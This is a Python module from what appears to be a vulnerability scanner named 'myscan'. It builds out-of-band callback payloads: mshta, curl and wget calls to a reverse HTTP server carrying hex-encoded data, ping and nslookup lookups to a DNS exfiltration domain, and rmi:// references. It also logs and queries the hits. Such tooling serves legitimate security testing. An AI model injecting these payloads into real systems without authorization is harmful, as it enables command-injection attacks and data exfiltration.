#!/usr/bin/env python3
# @Time    : 2020-02-23
# @Author  : caicai
# @File    : common_reverse.py

import sqlite3
import re
import os
import platform
import binascii
from myscan.config import reverse_set
from contextlib import closing
from myscan.lib.core.data import logger
from myscan.lib.core.common import get_random_str
import requests
import time
import tempfile
import subprocess

TABLE = "reversedb"


def run_cmd(cmd, timeout=10):
    f = tempfile.SpooledTemporaryFile()
    fileno = f.fileno()
    app = subprocess.Popen(cmd, shell=True, stdout=fileno, stderr=fileno)
    waittime = 1
    deadtime = time.time() + timeout
    while time.time() < deadtime and app.poll() == None:
        time.sleep(waittime)
    if app.poll() == None:
        app.terminate()
    if f:
        f.close()


def connect_db():
    return sqlite3.connect(reverse_set.get("db_file"))


def init_db():
    with closing(connect_db()) as db:
        db.execute(
            '''CREATE TABLE IF NOT EXISTS {} (id INTEGER PRIMARY KEY AUTOINCREMENT, query TEXT, info TEXT,type TEXT,client TEXT,time TEXT)'''.format(
                TABLE))
        db.commit()
        # 插入test msg
        insert_db(
            {
                "type": "test",
                "client": "1.1.1.1",
                "info": "this is a test msg by myscan, you can ignore this ",
                "query": "myscantest",
                "time": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
            }
        )


def insert_db(insert_data):
    '''
    insert_data :dict
    '''
    with closing(connect_db()) as db:
        db.execute('insert into {} (type, client, info,query,time) values (?, ?, ?,?,?)'.format(TABLE),
                   [insert_data.get("type"), insert_data.get("client"), insert_data.get("info"),
                    insert_data.get("query"),
                    insert_data.get("time")])
        db.commit()


def cut_text(text, lenth):
    textArr = re.findall('.{' + str(lenth) + '}', text)
    textArr.append(text[(len(textArr) * lenth):])
    return textArr


def getrealdnsdata(urlpath):
    '''
        domain :like x.y.z ,x,y,z length should be < 64, and total length (x.y.z) <255
       '''
    data = ""
    for x in range(len(urlpath), 1, -1):
        hexdata = binascii.b2a_hex(bytearray(urlpath)[0:x]).decode()
        data = get_random_str(4).lower() + ".".join(cut_text(hexdata, 55)) + "." + reverse_set.get("reverse_domain")
        if len(data) > 250:
            continue
        else:
            break
    return data


def generate_reverse_payloads(urlpath, type="http"):
    '''
    urlpath: string or bytes, url's path or others you wanto paste infos,don't contains url args ,it will to longs ,like http://www.test.com/admin/login
    type : string ,accept http,dns,rmi
    return ([cmd1,cmd2],payload)
    '''
    # if "?" in urlpath:
    #     urlpath = urlpath.split("?", 1)[0]

    if isinstance(urlpath, str):
        urlpath = urlpath.encode()

    payloads = {
        "http": ["mshta {url}", "curl {url}", "wget {url}"],
        "dns": ["ping -n 2 {domain}", "ping -c 2 {domain}" "nslookup {domain}"],
        "rmi": ["rmi://{}:{}/{}"],
    }
    reverse_payloads = []
    hexdata = ""
    if type == "http":
        hexdata = get_random_str(4).lower() + binascii.b2a_hex(urlpath).decode()
        for payload in payloads["http"]:
            reverse_payloads.append(
                payload.format(url="http://{}:{}/?d={}".format(reverse_set.get("reverse_http_ip"),
                                                               reverse_set.get("reverse_http_port"), hexdata)))
    elif type == "dns":
        hexdata = getrealdnsdata(urlpath)
        for payload in payloads["dns"]:
            reverse_payloads.append(
                payload.format(domain=hexdata)
            )
    elif type == "rmi":
        hexdata = get_random_str(4).lower() + binascii.b2a_hex(urlpath).decode()
        for payload in payloads["rmi"]:
            reverse_payloads.append(
                payload.format(reverse_set.get("reverse_rmi_ip"),
                               reverse_set.get("reverse_rmi_port"),
                               hexdata)
            )

    return (reverse_payloads, hexdata)


def query_reverse(payload, sleep=True):
    '''
    return list : (result:bool,result_data:list)
    '''
    if sleep:
        time.sleep(int(reverse_set.get("sleep", 5)))
    try:
        r = requests.get("http://{}:{}/search?query={}&key={}".format(reverse_set.get("reverse_http_ip"),
                                                                      reverse_set.get("reverse_http_port"),
                                                                      payload,
                                                                      reverse_set.get("secret_key")),
                         timeout=5)
        res = r.json()
        if res.get("total") > 0:
            return True, res
        else:
            return False, res

    except Exception as ex:
        logger.debug("Get result from reverse http server error:{}".format(
            ex) + "May be your network can't connect to {}".format(reverse_set.get("reverse_http_ip")))
        return False, []


def check_reverse():
    ver = platform.system()
    dns_random_str = "myscan_dnstest_" + get_random_str(10)
    http_random_str = "myscan_httptest_" + get_random_str(10)
    domain = "{}.{}".format(dns_random_str, reverse_set.get("reverse_domain"))
    url = "http://{}:{}/?d={}".format(reverse_set.get("reverse_http_ip"), reverse_set.get("reverse_http_port"),
                                      http_random_str)
    logger.info("Will exec ping ,nslookup,mshta,curl,wget to test server , it will take around 20s")
    if ver.lower() == "windows":
        cmd = "ping -n 2 {}>nul & nslookup {} >nul & mshta {}".format(domain, domain, url)
    else:
        cmd = "ping -c 2 {} 2>&1 >/dev/null & nslookup {} 2>&1 >/dev/null & curl {} 2>&1 >/dev/null & wget {} --output-document=/dev/null".format(
            domain, domain, url, url)
    logger.info("Start exec cmd:{}".format(cmd))
    run_cmd(cmd)
    res_http = query_reverse(http_random_str)
    res_dns = query_reverse(domain, False)
    #此处需添加rmi 服务的检测代码，需本地模拟一个rmi的client


    if res_http[0]:
        logger.critical("Client connect http reverse server: Success")
    else:
        logger.warning("Client connect http reverse server: Fail")
    if res_dns[0]:
        logger.critical("Client connect dns reverse server: Success")
    else:
        logger.warning("Client disconnect dns reverse server: Fail")

